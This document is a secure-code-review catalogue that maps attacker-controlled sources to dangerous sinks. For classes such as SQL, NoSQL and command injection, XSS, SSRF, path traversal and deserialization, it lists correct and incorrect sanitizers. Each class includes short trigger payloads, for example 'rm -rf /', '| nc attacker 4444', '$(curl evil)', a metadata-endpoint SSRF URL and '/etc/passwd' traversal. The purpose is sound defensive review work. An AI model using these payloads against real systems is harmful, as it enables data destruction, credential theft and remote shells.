# Source → sink catalogue

The core of this review is taint tracing: untrusted **source** → dangerous **sink**, and
whether the **sanitizer** that neutralizes that sink is present and correct. This file is the
working catalogue. A finding is a (source, sink) pair where tainted data reaches the sink
without the right sanitizer, *and the path is reachable*.

---

## Sources — where attacker-controlled data enters

Treat anything an attacker can influence as tainted. Common sources:

- **HTTP request:** query params, path/route segments, body (JSON/form/multipart), headers
  (incl. `Host`, `X-Forwarded-*`, `Referer`, `User-Agent`), cookies.
- **Uploaded content:** file bytes, **filenames** (path traversal), content-type, size.
- **External systems:** webhook payloads, message-queue/Kafka events, responses from another
  service or third-party API, DNS, OAuth callback params.
- **WebSocket / streaming** frames.
- **Stored, tainted data:** a value pulled from the DB/cache that *originally* came from a
  user is **still tainted** (this is how stored XSS and second-order SQL injection happen).
- **Indirect:** environment/config derived from a request, deserialized objects,
  reflected error messages echoing input.

Rule of thumb: if a value's content can be chosen by someone outside your trust boundary,
it is a source — even if it took three hops to get here.

---

## Sinks, sanitizers, and the attack — by vulnerability class

For each class: the **sink** (where damage happens), the **only** thing that makes it safe,
the wrong "fix" that *looks* safe but isn't, and the input that proves reachability.

### SQL injection
- **Sink:** any SQL string built with concatenation/interpolation/f-string/`format`, dynamic
  `ORDER BY`/`LIMIT`/table/column names, `LIKE` patterns.
- **Safe:** parameterized queries / prepared statements / bound params; an **allow-list** for
  identifiers (column/table/direction) that can't be parameterized.
- **NOT safe:** manual quote-escaping (`replace("'", "''")`), an ORM method that still takes a
  raw string fragment, "the framework escapes it" without checking it actually does here.
- **Trigger:** `id=1 OR 1=1`, `'; DROP TABLE users;--`, `name=' UNION SELECT password ...`.

### NoSQL injection (Mongo/Redis/etc.)
- **Sink:** query objects built from request JSON where an attacker can inject **operators**
  (`{"$gt": ""}`, `{"$ne": null}`, `$where` with JS), Redis commands built from input.
- **Safe:** validate/cast types (a field expected to be a string must be a string, not an
  object); never pass raw request bodies as query filters; avoid `$where`/server-side JS.
- **Trigger:** `{"password": {"$ne": null}}` to bypass a login filter.

### Command injection
- **Sink:** `system`/`exec`/`popen`/`spawn`/`sh -c`/backticks/`subprocess(..., shell=True)`
  with any input in the command string.
- **Safe:** pass args as an **array/argv** (no shell), with a fixed binary; allow-list values;
  avoid the shell entirely.
- **NOT safe:** escaping shell metacharacters by hand; blocklisting `;` and `|`.
- **Trigger:** `file.txt; rm -rf /`, `$(curl evil)`, `| nc attacker 4444`.

### XSS (cross-site scripting)
- **Sink:** rendering input into HTML/JS/CSS/attribute/URL context — `innerHTML`,
  `dangerouslySetInnerHTML`, `v-html`, unescaped template output (`{{{ }}}`, `| safe`,
  `mark_safe`), DOM sinks (`document.write`, `eval`, `setAttribute('href', ...)`).
- **Safe:** context-aware **output encoding** (HTML-escape for body, attribute-encode for
  attrs, JS-encode for script context); a vetted sanitizer (DOMPurify) for rich HTML; CSP as
  defense-in-depth, not a primary fix.
- **NOT safe:** input filtering / blocklisting `<script>`; encoding for the wrong context.
- **Trigger:** `<img src=x onerror=alert(1)>`, `javascript:alert(1)` in an `href`,
  `"><svg onload=...>` to break out of an attribute.
- **Note:** stored XSS — tainted data from the DB rendered without encoding — is the same
  sink, a different source. Check render paths even when the diff only touches storage.

### SSRF (server-side request forgery)
- **Sink:** outbound HTTP/TCP/file fetch (`fetch`, `requests.get`, `http.Get`, image/URL
  preview, webhook callback, PDF/HTML-to-image) with a **user-controlled URL or host**.
- **Safe:** allow-list of permitted hosts/schemes; resolve DNS and **block private/link-local/
  metadata ranges** (127/8, 10/8, 169.254.169.254, `::1`, etc.); disable redirects or
  re-validate each hop; no `file://`/`gopher://`.
- **NOT safe:** a regex that "looks like an external URL"; blocklisting `localhost` only
  (bypass via `127.0.0.1`, `0.0.0.0`, decimal IP, DNS rebinding).
- **Trigger:** `url=http://169.254.169.254/latest/meta-data/` to steal cloud credentials.

### Path traversal / arbitrary file access
- **Sink:** building a filesystem path from input — `open`/`readFile`/`sendFile`/`os.path.join`/
  static-file serving, ZIP/tar extraction (**zip-slip**) using entry names.
- **Safe:** canonicalize (`realpath`) then assert the result is **inside** the intended base
  dir; reject `..` and absolute paths; use a generated id, not the user's filename.
- **NOT safe:** stripping `../` once (bypass: `....//`), checking before canonicalization.
- **Trigger:** `../../../../etc/passwd`, `..%2f..%2f`, an absolute path, a symlink in an archive.

### Open redirect
- **Sink:** `redirect(url)` / `Location` header / `returnTo` param taken from input.
- **Safe:** allow-list of redirect targets, or only allow relative paths (reject `//host`,
  `https:`, backslashes).
- **Trigger:** `?next=https://evil.com` used for phishing/token theft.

### Insecure deserialization
- **Sink:** deserializing untrusted bytes with a format that can instantiate arbitrary types
  or run code — `pickle`, Java `ObjectInputStream`, PHP `unserialize`, YAML `load` (not
  `safe_load`), `Marshal.load`, .NET `BinaryFormatter`.
- **Safe:** use a data-only format (JSON) with schema validation; never deserialize untrusted
  input into live objects; if unavoidable, allow-list permitted classes.
- **Trigger:** a crafted pickle/gadget chain → RCE.

### LDAP / XPath / header / template injection (don't forget these)
- **LDAP:** input in a filter (`(uid=<input>)`) → escape with the LDAP filter encoder; trigger
  `*)(uid=*))(|(uid=*`.
- **Header / CRLF / response splitting:** input into a response header → strip CR/LF.
- **Server-side template injection (SSTI):** input rendered *as* a template (not data) →
  never compile user input as a template; trigger `{{7*7}}` → `49`.
- **XXE:** XML parser with external entities enabled on untrusted XML → disable DTD/external
  entities.

---

## How to credit a sanitizer (the check that prevents false positives)

When a sanitizer *is* present, before you clear the sink, confirm all three:

1. **Right kind for the sink.** Output-encoding stops XSS, not SQL injection. Parameterization
   stops SQL injection, not command injection. Matching matters.
2. **On every path to the sink.** A second code path (the error branch, the admin route, the
   cache-miss path) that reaches the same sink *without* the sanitizer reopens the hole.
3. **Not bypassable.** Double-encoding, null bytes, unicode normalization, case, a check that
   runs *before* canonicalization, an allow-list with a wildcard. If you can think of a
   bypass, trace it.

Only after these three does the sink get a pass. If you can't confirm, it's a *question*, not
a clean bill of health.
